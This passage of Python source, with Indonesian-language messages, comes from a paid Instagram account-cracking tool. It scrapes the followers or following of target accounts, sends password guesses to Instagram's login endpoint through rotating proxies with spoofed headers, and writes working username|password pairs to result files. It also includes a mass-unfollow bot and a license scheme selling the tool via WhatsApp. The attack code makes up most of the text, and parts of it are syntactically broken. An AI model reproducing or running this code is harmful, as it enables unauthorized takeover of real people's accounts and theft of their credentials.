            x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
            x_jason=x.json()["data"]["user"]
            nama=x_jason["full_name"]
            pengikut=x_jason["edge_followed_by"]["count"]
            mengikut=x_jason["edge_follow"]["count"]
            postingan=x_jason["edge_owner_to_timeline_media"]["count"]
        except:
            pass

        return nama,pengikut,mengikut,postingan

    def crackAPI(self,user,pas):
        global loop,success,checkpoint
        prog.update(des,description=f"crack {str(loop)}/{len(internal)} OK : {H}{len(success)}{N} CP : {K}{len(checkpoint)}{N}")
        prog.advance(des)
        try:
            for pw in pas:
                xyaa_code=random.randint(1000000000, 99999999999)
                ts = calendar.timegm(current_GMT)
                proxy = {'http': 'socks5://'+random.choice(proxxy)}
                p = ses.get('https://z-p42.www.instagram.com/accounts/onetap/?next=%2F')
                headers = {
                    'Host':'www.instagram.com',
                    'connection':'keep-alive',
                    'sec-ch-ua':'";Not A Brand";v="99", "Chromium";v="94"',
                    'x-ig-app-id':'1217981644879628',
                    'x-ig-www-claim':'0',
                    'sec-ch-ua-mobile': '?1',
                    'x-instagram-ajax':'4b5f8c8eb791',
                    'content-type':'application/x-www-form-urlencoded',
                    'accept':'*/*',
                    'x-requested-with':'XMLHttpRequest',
                    'x-asbd-id':'198387',
                    'user-agent':uaku,
                    'x-csrftoken':token.cookies['csrftoken'],
                    'sec-ch-ua-platform': '"Android"',
                    'origin':'https://www.instagram.com',
                    'sec-fetch-site':'same-origin',
                    'sec-fetch-mode':'cors',
                    'sec-fetch-dest':'empty',
                    'referer':'https://www.instagram.com/accounts/login/?next=/graphql/query/',
                    'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                }
#					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),


                param={
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
                    "username": user,
                    "optIntoOneTap": 'false',
                    "queryParams": "{}",
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": "{}"}
                x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
                x_jason=json.loads(x.text)
                if "userId" in str(x_jason):
                    coki = (f'mid={ses.cookies.get_dict()["mid"]};ig_did={ses.cookies.get_dict()["ig_did"]};ig_nrcb=1;shbid="9776\0541986587953\0541674289809:01f713acdf5c4921a542aff43695805d8e788f5580f4efaaf714ca7301ba34bb727790c9";shbts="1642753809\0541986587953\0541674289809:01f7227f6219fb0a036e3593c1531e9b9c9eb1db9dcbb7b4590ba36ffcbe62715eb10ada";csrftoken={ses.cookies.get_dict()["csrftoken"]};ds_user_id={ses.cookies.get_dict()["ds_user_id"]};sessionid={ses.cookies.get_dict()["sessionid"]};rur="EAG\0541986587953\0541674477820:01f724c03ff38f24662b1648dd2a933fc4a6e66b7a2bef2458d140bfb76ee86296f6cd8b"');nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    tree = Tree("")
                    tree.add(f"\r{H}{nama}|{user}{N}")
                    tree.add(f"\r{N}Pengikut : {H}{pengikut}{N}")
                    tree.add(f"\r{N}Mengikuti : {H}{mengikut}{N}")
                    tree.add(f"\r{N}Postingan : {H}{postingan}{N}").add(f"\r{N}User Agent : {H}{uaku}{N}")
                    prints(tree)
                    os.popen("play-audio data/dapet.mp3")
                    open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    success.append(user)
                    break
                elif 'checkpoint_url' in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    tree = Tree("")
                    tree.add(f"\r{M}{nama}|{user} {N} ")
                    tree.add(f"\r{N}Pengikut : {K}{pengikut}{N}")
                    tree.add(f"\r{N}Mengikuti : {K}{mengikut}{N}")
                    tree.add(f"\r{N}Postingan : {H}{postingan}{N}").add(f"\r{N}Status : {H} Login gagal Lord ×{N}")
                    prints(tree)
                    open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    checkpoint.append(user)
                    break

                elif 'Please wait a few minutes' in str(x.text):
                    sys.stdout.write(f"\r  [\033[31m•\033[0m] IP KENA SPAM TUNGGU BEBERAPA MENIT{C}");sys.stdout.flush();sleep(0)
					#self.crackAPI(user,pas)
    #            elif 'ip_block' in str(x.text):
   #                 sys.stdout.write(f"\r┣[{U}!{C}] {U}IP DI BLOKIR ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0)
  #                  self.crackAPI(user,pas)
 #               elif 'spam' in str(x.text):
#                    sys.stdout.write(f"\r┣[{U}!{C}] {U}TERDETEKSI SPAM ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)

                else:
                    continue

            loop+=1
        except:
            self.crackAPI(user,pas)

    def checkAPI(self,user,pw):
        try:
            token=s.get("https://www.instagram.com/",headers={"user-agent":USN}).content
            crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
            s.headers.update({
                'authority': 'www.instagram.com',
                'x-ig-www-claim': 'hmac.AR3CH3q3WF_EHwNgjQj_uhjG15AF1ckFwoqU4QVfeHdOiBCT',
                'x-instagram-ajax': '82a581bb9399',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'user-agent': USN,
                'x-requested-with': 'XMLHttpRequest',
                'x-csrftoken': crf_token,
                'x-ig-app-id': '936619743392459',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            })

            param={
                "username": user,
                "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                "optIntoOneTap": False,
                "queryParams": {},
                "stopDeletionNonce": "",
                "trustedDeviceRecords": {}
            }
            x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
            x_jason=json.loads(x.text)
            if "userId" in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                tree = Tree("")
                tree.add(f"\r{H}{user}|{pw}{N}")
                tree.add(f"\r{N}Pengikut : {H}{pengikut}{N}")
                tree.add(f"\r{N}Mengikuti : {H}{mengikut}{N}")
                tree.add(f"\r{N}Postingan : {H}{postingan}{N}").add(f"\r{N}Tooken : {H}{crf_token}{N}")
                prints(tree)
                open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                success.append(user)
                
             

            elif 'checkpoint_url' in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                tree = Tree("")
                tree.add(f"\r{M}{nama}|{user} {N} ")
                tree.add(f"\r{N}Pengikut : {K}{pengikut}{N}")
                tree.add(f"\r{N}Mengikuti : {K}{mengikut}{N}")
                tree.add(f"\r{N}Postingan : {K}{postingan}{N}")
                prints(tree)
                checkpoint.append(user)
                
               

            elif 'Please wait a few minutes' in str(x.text):
                sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
                self.checkAPI(user,pw)
        except:
            self.checkAPI(user,pw)

    def menu(self):
        self.logo()
        c=input(f'  [\033[31m•\033[0m] chouse : ')
        if c=='':
            self.menu()
        elif c in ('1','01'):
            cetak(nel(f"""[white][[green]•[white]] Masukan Jumlah Pencarian """,style="#808000"));m=int(input(f'  [\033[31m•\033[0m] Jumlah : '))
            cetak(nel(f"""[white][[green]•[white]] Masukan Nama Randome""",style="#808000"))
            for i in range(m):
                i+1
                nama=input(f'  [\033[31m•\033[0m] Masukan nama ({H}{len(internal)}{C}): ')
                name=self.searchAPI(self.cookie,nama)
            self.passwordAPI(name)

        elif c in ('2','02'):
            cetak(nel(f"""[white][[green]•[white]] Pastikan Target Instagram Anda Publick""",style="#808000"))
            mas=input('  [\033[31m•\033[0m] anda ingin crack masal? y/t >  ')
            if mas in ['y','Y']:
                masal(self)
            elif mas in ['t','T']:
                massal(self)
            elif mas in ['']:
                print('  [\033[31m•\033[0m] ISI JANGAN KOSONG KENTOD!')


        elif c in ('3','03'):
            cetak(nel(f"""[white][[green]•[white]] Pastikan Target Instagram Anda Publick""",style="#808000"))
            mas=input('  [\033[31m•\033[0m] anda ingin crack masal? y/t >  ')
            if mas in ['y','Y']:
                mengi(self)
            elif mas in ['t','T']:
                meng(self)
            elif mas in ['']:
                print('  [\033[31m•\033[0m] ISI JANGAN KOSONG KENTOD!')


        elif c in ('4','04'):
            print('')
            for i in os.listdir('result'):
                print(f'  [\033[0m\033[31m•\033[0m] •-> {i}')
            c=input(f'\n  [\033[31m•\033[0m] Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            print(f'  [\033[31m•\033[0m] Total Result Asepitgans {H}{len(g)}{C}')
            print(f'  [\033[31m•\033[0m] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                self.checkAPI(usr,pwd)
            exit(f'  [\033[31m#\033[0m] proses check selesai...{C}')

        elif c in ('5','05'):
            print('')
            for i in os.listdir('result'):
                print(f'  [\033[0m\033[31m•\033[0m] •-> {i}')
            c=input(f'\n  [\033[31m•\033[0m] Masukan nama file: ')
            g=open("result/%s"%(c)).read().splitlines()
            xx=c.split("-")
            xc=xx[0]
            print(f'  [\033[31m•\033[0m] Total result yang di temukan [{H}{len(g)}{C}]')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                fol=s.split("|")[2]
                ful=s.split("|")[3]
                if xc=="checkpoint":
                    print(f"""\r\n  {C}*--> Login Checkpoin\_> {M}Gak{C}
  {M}{C}*-->{C} Username  : {M}{usr}{C} - {M}{pwd}{C}
  {M}{C}*-->{C} Pengikut  : {M}{ful}{C} - {M}{fol}{C}
                    """);sleep(0.05)
                else:
                    print(f"""\r\n {C} *--> Login Berhasil\_> {H}Ok{C}
  {H}{C}*-->{C} Username  : {H}{usr}{C} - {H}{pwd}{C}
  {H}{C}*-->{C} Pengikut  : {H}{fol}{C} - {H}{ful}{C}
                    """);sleep(0.05)
        elif c in ('6','06'):
        	cetak(nel(f"""[white][[green]•[white]] Sedang Dalam Perbaikan"""));exit()
        elif c in ('6','06'):
            global following
            six=0
            print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
            x=open('.kukis.log','r').read()
            x_id=re.findall('sessionid=(\d+)',x)[0]
            back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
            for i in following:
                six+=1
                sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
                six_id=self.sixAPI(i)
                print(f' {str(six)}{U}}}{C} {i} {H}Unfollow-Berhasil{C}')
                self.unfollowAPI(six_id,'5452333948',self.cookie)
                #print(w)
            input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()

        elif c in ('7','07'):
            self.BUG()
      #  elif c in ('c','C'):
         #   self.ChangeLog()
        elif c in ('8','08'):
            self.Exit()

        else:
            self.menu()
            
          

def mengi(self):
            try:
                menudump.append('pengikut')
                cetak(nel(f"""[white][[green]•[white]] Target harus bersifat publik jangan privat""",style="#808000"))
                m=int(input(f'  [\033[31m•\033[0m] Jumlah : {N}'))
            except:m=1
            for t in range(m):
                t +=1
                print('  [\033[31m•\033[0m] Total User : %s'%({len(internal)}))
                nama=input(f'  [{t}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
            self.passwordAPI(info)

def meng(self):
    m=input(f'  [\033[31m•\033[0m] Username : ')

    id=self.idAPI(self.cookie,m)
    info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
    self.passwordAPI(info)

def masal(self):
            try:
                menudump.append('pengikut')
                print('\n[•] Target harus bersifat publik jangan privat')
                m=int(input(f'[•] Jumlah : '))
            except:m=1
            for t in range(m):
                t +=1
                print('[•] Total User : %s'%({len(internal)}))
                nama=input(f'[{t}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)



def massal(self):
            menudump.append('pengikut')
           # print('\n[•] Target harus bersifat publik jangan privat')
            m=input(f'[•] Username : ')

            id=self.idAPI(self.cookie,m)
            info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)

kentod = random.choice(["MORHE-UUQDM-OOFJR-IBRJZ","ASE-SIPAL-ING-GANSKUIT","LIMPL-XDZGC-NNVDR-NXGXK","LHEZL-RPKJG-IPPOR-YWXGV","JOJQR-GKFVW-VLYJT-UNITI","GSNEP-NTRCE-CTKYK-OIAGD","LTQVM-NRQSC-LVJCL-SVQTD","HCYUY-ADXUB-MPCVJ-DGNQE","JHSQH-YAYOT-WDWFU-FAYIV","MTIRZ-YXKRT-ZEYGN-UWJMK","LWGOO-ZPRNJ-FKDXT-YNBZB","GTSCS-MEXZL-YXMLX-NLUCT","KWQRM-ROFYY-YLBST-BKXAE","LISBX-TPVSB-WXKEV-XOMIB","JVFEN-WKCFP-XLLXV-GAKUS","LEHBK-GBLHK-NACGN-EEHUW","KAEPL-IBDPP-WQYGN-PMUSI","KVIZG-ILJVO-EKFYT-THGKZ"])


kentodd=random.choice([kentod])


crot=(kentodd)

def getkey():
    import json, requests
    try:
        openkey = open(".key.txt","r").read()
        files = openkey.split("\n")[1]
        key = openkey.split("\n")[0]
    except FileNotFoundError:
        #os.system("clear")
        #none();time.sleep(1)
        print("\n\033[0m•> Author breaksek ")
        print("\033[0m•> License Anda Tidak Tersedia ");time.sleep(2)
        print("\n~> 100k : 1 bulan\n~> 50k : 2 minggu\n~> 25k : 1 Minggu")
        print ("")
        print("\033[0m•> license anda :\033[32m "+crot);time.sleep(1)
        namamu = input("\033[0m•> nama anda : ")
        yt = input("\033[0m•> Chat Admin Untuk Beli Lisensi y/t? > ")
        if yt in ["Y","y"]:
            os.system("xdg-open https://wa.me/+6281331184338?text=Hai+bg+rif,+aku+mau+beli+scriptnya+tapi+yang+versi+premium.+Ini+lisensinya:%20"+crot+"+konfirmasi+nama+pembeli:%20"+namamu)
            open(".key.txt","w").write(crot+"\n"+namamu)
            exit()
        else:
            exit("\033[0m•> Telah keluar program")
    try:
        confirmkey = requests.get("https://raw.githubusercontent.com/breaksek/igprem/main/key.txt").json()
    except requests.exceptions.ConnectionError:
        print("\033[0m[!] Jaringan Internet Kamu Tidak Ada");exit()
    if confirmkey[files] == key:
        if confirmkey[files] == "tidakada":
            print("\n\033[0m~> Lisensi key Kamu Sudah Kadaluarsa <~")
            os.system("rm -rf .key.txt");exit()
        else:
        	print("\n\033[0m~> Lisensi key Kamu Sudah Aktif <~");time.sleep(1);login_kamu()
    else:
        print("\n\033[0m╰─ Lisensi key Kamu Sudah Kadaluarsa")
        os.system("rm -rf .key.txt");exit()

import requests, json

P = '\x1b[1;97m'
M = '\x1b[0;31m'
H = '\x1b[0;32m'
K = '\x1b[0;33m'
B = '\x1b[0;34m'
U = '\x1b[0;35m' 
O = '\x1b[0;36m'
exp = []
status = []
email = []
nama_a = []

def free():
	if os.path.isfile("/data/data/com.termux/files/usr/bin/.asep"):
		exit(f"- Lisensi Hanya berlaku 1 Kali")
	nama = input(f'- Nama {M}:{H} ')
	data = {"Authorization":"Admin","name":nama,"hari":"1"}
	res = requests.post("https://xenzi-apikey.herokuapp.com/api/create-free",params=data).text
	respon = json.loads(res)
	if "berhasil membuat apikey" in respon["massage"]:
		nama_a.append(respon['nama'])
		status.append(respon['status'])
		exp.append(respon['exp'])
		email.append(respon['email'])
		print(f"- Nama {M}: {H}{respon['nama']}")
		print(f"- Email {M}: {H}{respon['email']}")
		open(".apikey.txt","w").write(respon["apikey"])
		open("/data/data/com.termux/files/usr/bin/.asep","w").write(" Free Apikey cuman 1 kali >_<")
		time.sleep(2)
		login()
	else:
		print(f"- Mohon Maaf Lisensi Anda Tidak Terdaftar")
def prem():
	os.system("rm -rf .apikey.txt")
	print(f"\n- Masukan Lisensi Terlebih dahulu Jika Tidak Punya Silahkan Upgrade")
	key = input(f"- Liseni : ")
	if not "Premium-" in key:
		print(f"- Lisensi Tidak Terdaftar Silahkan Beli Terlebih dahulu")
		exit()
	else:
		try:
			data = {"Authorization":"Admin","apikey":key}
			res = requests.get("https://xenzi-apikey.herokuapp.com/api/check-status",params=data).text
			respon = json.loads(res)
			if 'apikey kadelwarsa' in respon['massage']:
				print(f"- Lisensi Anda Sudah kedaluwarsa")
				os.system("rm -rf .apikey.txt")
				apikey()
			elif 'berhasil check apikey' in respon['massage']:
				nama_a.append(respon['nama'])
				status.append(respon['status'])
				exp.append(respon['exp'])
				email.append(respon['email'])
				print(f"\n- Lisensi Sudah Aktif")
				print(f"\033[0m- Email \033[32m{email[0]}\033[31m {nama_a[0]}\033[0m")
				open(".apikey.txt","w").write(key)
				time.sleep(2)
				login_kamu()
			else:
				print(f"- Mohon Maaf Lisensi Anda Tidak Terdaftar")
				os.system("rm -rf .apikey.txt")
				apikey()
		except json.decoder.JSONDecodeError or KeyError:
			print(f"- Server Sedang eror")
			exit()

def apikey():
	banner()
	print(f'\033[0m- \033[0m\033[41mAuthor Asepitgans\033[0m\n- \033[0m\033[41mGithub https://github.com/privatescrip\033[0m')
	print('')
	os.system("rm -rf .apikey.txt")
	#print(f"1. Free 1 hari ")
	print(f"1. Masukan Lisensi ")
	print(f"2. Upgrade Premium ")
	chs = input(f"\n- Chouse : ")
	if chs in ["1","01"]:
		prem()
	elif chs in ["2","02"]:
		print('\n- 100k 1bulan\n- 50k 2minggu\n\n- Masukan Pesan, Info Tambahkan Tanda + Untuk Spasi Pesan');i=input('- Pesan : ');print('- Pesan Anda : \033[32m%s \033[0mAkan Segera Terkirim Mohon Tunggu....'%(i));time.sleep(2);os.system('xdg-open https://wa.me/6281331184338?text=%s'%(i));exit()
	#elif chs in ["3","03"]:
		#print('\n- ');print('- Masukan Pesan Untuk Di Kirim Ke Admin');i=input('- Pesan : ');print('- Pesan Anda : \033[32m%s \033[0mAkan Segera Terkirim Mohon Tunggu....'%(i));time.sleep(2);os.system('xdg-open https://wa.me/6281331184338?text=%s'%(i));exit()
def check():
	try:os.mkdir('data')
	except:pass
	try:os.mkdir('result')
	except:pass
	try:
		key = open(".apikey.txt","r").read()
		if not "Premium-" in key:
			apikey()
		else:
			try:
				data = {"Authorization":"Admin","apikey":key}
				res = requests.get("https://xenzi-apikey.herokuapp.com/api/check-status",params=data).text
				respon = json.loads(res)
				if 'apikey kadelwarsa' in respon['massage']:
					print(f"- Lisensi Anda Sudah kedaluwarsa")
					os.system("rm -rf .apikey.txt")
					apikey()
				elif 'berhasil check apikey' in respon['massage']:
					nama_a.append(respon['nama'])
					status.append(respon['status'])
					exp.append(respon['exp'])
					email.append(respon['email'])
					print(f"\033[0m\n- Lisensi Anda Tersisa{H} {respon['tersisa']}")
					time.sleep(2)
					login_kamu()
				else:
					print(f"- Mohon Maaf Lisensi Anda Tidak Terdaftar")
					os.system("rm -rf .apikey.txt")
					apikey()
			except json.decoder.JSONDecodeError or KeyError:
				print(f"- Server Sedang eror")
				exit()
	except FileNotFoundError:
		apikey()
	except json.decoder.JSONDecodeError or KeyError:
		print(f"- Server Sedang eror")
		exit()



if __name__=='__main__':
    try:
    	login_kamu()
    except requests.exceptions.ConnectionError:
        exit(f'\n[{M}!{C}] Koneksi internet bermasalah')
    folder()